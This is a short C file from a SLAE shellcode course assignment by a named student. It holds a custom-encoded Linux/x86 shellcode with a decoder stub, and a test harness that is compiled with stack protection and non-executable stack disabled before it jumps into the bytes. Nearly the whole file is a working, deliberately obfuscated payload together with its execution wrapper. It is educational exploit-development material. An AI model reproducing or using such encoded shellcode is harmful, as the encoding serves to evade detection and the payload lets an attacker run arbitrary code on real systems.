/*
 *      SLAE - Assignment #4: Custom Encoded/decoded Shellcode (Linux/x86)
 *      Author: Alain Menelet 
 *      StudentID - SLAE-3763
 *      HowTo: gcc -fno-stack-protector -z execstack test_shellcode.c -o test_shellcode
 */

#include <stdio.h>
#include <string.h>


unsigned char code[] = \
"\xeb\x3d\x5e\x56\x89\xf7\x31\xc9\xf7\xe1\xb1\x17\x31\xc0\x31\xdb\x31\xd2\x8a\x07\x3c\xff\x74\x1a\x8a\x57\x01\x28\xc2\x8a\x5f\x02\x28\xc3\x30\xda\x88\x16\x88\x5e\x01\x46\x46\x47\x47\x47\xe2\xdc\xeb\x0a\x8a\x5f\x01\x8a\x57\x02\x30\xd3\x88\x1e\xff\x14\x24\xe8\xbe\xff\xff\xff\x02\xfa\xcb\x09\x1f\xea\x03\x45\xce\x05\x2e\xb5\x04\x6d\xd1\x07\x7e\xfe\x04\xb4\x55\x03\x4a\x32\x03\x5f\x76\x01\x01\x69\x0a\x57\x6c\x06\x0d\x74\x06\x70\xe9\x0a\xe2\x93\x0a\xbb\x5d\x01\x69\xe2\x09\xc4\x14\x02\x4f\x82";



int main()
{

        printf("taille %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

        return 0;

}
